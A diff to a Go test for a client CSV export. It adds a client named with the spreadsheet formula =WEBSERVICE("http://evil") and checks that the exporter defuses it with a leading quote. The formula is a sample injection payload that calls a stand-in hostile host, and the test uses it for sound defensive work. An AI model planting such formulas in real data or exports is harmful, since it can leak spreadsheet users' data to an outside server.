@@ -19,6 +19,10 @@ func TestClientCsvExport(t *testing.T) {
 	h.expect(h.do("POST", "/api/v1/clients", admin, map[string]any{
 		"name": "Acme, Inc.", "industry": "Widgets",
 	}), http.StatusCreated, "create client")
+	// A name that is a spreadsheet formula — the injection the sanitizer defuses.
+	h.expect(h.do("POST", "/api/v1/clients", admin, map[string]any{
+		"name": "=WEBSERVICE(\"http://evil\")", "industry": "x",
+	}), http.StatusCreated, "create formula-named client")
 
 	r := h.do("GET", "/api/v1/clients/export.csv", admin, nil)
 	if r.status != http.StatusOK {
@@ -51,6 +55,21 @@ func TestClientCsvExport(t *testing.T) {
 	}
 	if !found {
 		t.Errorf("the comma-bearing name did not round-trip as one field: %s", r.raw)
+	}
+
+	// The formula name must be neutralized: prefixed with a quote so a
+	// spreadsheet treats it as text, never a live =WEBSERVICE call.
+	var defused bool
+	for _, row := range records[1:] {
+		if row[1] == "'=WEBSERVICE(\"http://evil\")" {
+			defused = true
+		}
+		if row[1] == "=WEBSERVICE(\"http://evil\")" {
+			t.Errorf("formula name was written raw — CSV injection: %q", row[1])
+		}
+	}
+	if !defused {
+		t.Errorf("the formula name was not found neutralized in %s", r.raw)
 	}
 }
 
